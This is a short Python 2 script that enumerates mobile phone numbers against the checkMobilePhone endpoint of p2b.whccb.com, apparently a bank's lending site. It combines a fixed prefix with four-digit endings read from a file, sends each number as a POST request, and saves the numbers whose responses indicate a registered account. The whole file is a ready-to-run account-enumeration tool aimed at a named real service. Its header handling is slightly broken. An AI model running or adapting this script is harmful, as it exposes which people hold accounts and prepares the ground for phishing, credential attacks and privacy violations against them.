#! /usr/bin/python
#-*- coding:utf-8 -*-

import urllib2 as lib2
import urllib
import os
def main():
    httpHandler = lib2.HTTPHandler(debuglevel=0)
    httpsHandler = lib2.HTTPSHandler(debuglevel=0)
    opener = lib2.build_opener(httpHandler, httpsHandler)

    #lib2.install_opener(opener)
    req_url = 'http://p2b.whccb.com/f/member/checkMobilePhone';
    # 设置http报头
    req_headers = {
        'Host': 'p2b.whccb.com',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Accept':'*/*',
        'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding':'gzip, deflate',
        'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Referer':'http://p2b.whccb.com/',
        'Content-Length':'23',
        'Conection':'keep-alive'
    }
    # 设置发包内容
    base_number = "%d" %1300163
    tail_numbers = open("4tailNumber.txt","r")
    registed = open("registedNumber","w+")

    while True:
        tail_number = tail_numbers.readline()
        if tail_number:
            req_body = "mobilePhone="+base_number+tail_number
            #req_body='mobilePhone=18811392560'
            # urllib2提供 Request 类，用于添加http报1417
            # 头
            req = lib2.Request( req_url, req_headers )
            # 添加 post 数据
            res = lib2.urlopen( req, req_body )
            resp=res.read()
            print resp
            if "1" in resp:
                registed.write(base_number+tail_number)
        else:
            break


if __name__ == '__main__':
    main()